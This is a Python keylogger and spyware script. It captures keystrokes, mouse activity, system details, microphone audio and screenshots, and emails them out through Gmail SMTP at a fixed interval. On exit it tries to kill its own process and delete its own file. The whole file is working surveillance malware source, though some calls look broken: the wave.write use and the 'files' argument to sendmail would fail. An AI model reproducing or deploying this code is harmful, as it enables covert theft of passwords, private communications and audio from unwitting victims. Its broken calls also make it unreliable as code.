import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot as ImageGrab
import sounddevice as sd
from pynput import keyboard, mouse

# Initialize logging
logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s:%(message)s')

# Use environment variables for sensitive information
EMAIL_ADDRESS = os.getenv('EMAIL_ADDRESS')
EMAIL_PASSWORD = os.getenv('EMAIL_PASSWORD')
SEND_REPORT_EVERY = 60  # in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log += string

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}\n"
        self.append_log(current_move)

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_click = f"Mouse clicked at {x}, {y} with {button}\n"
            self.append_log(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y}\n"
        self.append_log(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = "SPACE"
            elif key == keyboard.Key.esc:
                current_key = "ESC"
            else:
                current_key = f" {str(key)} "
        self.append_log(current_key)

    def send_mail(self, email, password, message, attachment=None):
        try:
            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
            server.starttls()
            server.login(email, password)
            if attachment:
                server.sendmail(email, email, f"Subject: Keylogger Report\n\n{message}", files=[attachment])
            else:
                server.sendmail(email, email, f"Subject: Keylogger Report\n\n{message}")
            server.quit()
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        sys_info = f"Hostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n"
        self.append_log(sys_info)

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        filename = 'sound.wav'
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
        sd.wait()
        wave.write(filename, fs, recording)
        self.send_mail(email=self.email, password=self.password, message="Microphone recording attached.", attachment=filename)
        os.remove(filename)

    def screenshot(self):
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        self.send_mail(email=self.email, password=self.password, message="Screenshot attached.", attachment="screenshot.png")
        os.remove("screenshot.png")

    def run(self):
        self.system_information()
        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        keyboard_listener.start()
        
        # Start mouse listener
        mouse_listener = mouse.Listener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)
        mouse_listener.start()

        self.report()

        keyboard_listener.join()
        mouse_listener.join()

        # Clean up (this section should be platform specific and very carefully implemented)
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system(f"TASKKILL /F /IM {os.path.basename(__file__)}")
                print('File was closed.')
                os.system(f"DEL {os.path.basename(__file__)}")
            except OSError:
                print('File close operation failed.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system(f"chattr -i {os.path.basename(__file__)}")
                print('File was closed.')
                os.system(f"rm -rf {os.path.basename(__file__)}")
            except OSError:
                print('File close operation failed.')

if __name__ == "__main__":
    if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
        raise ValueError("Please set your email and password in environment variables.")
    
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
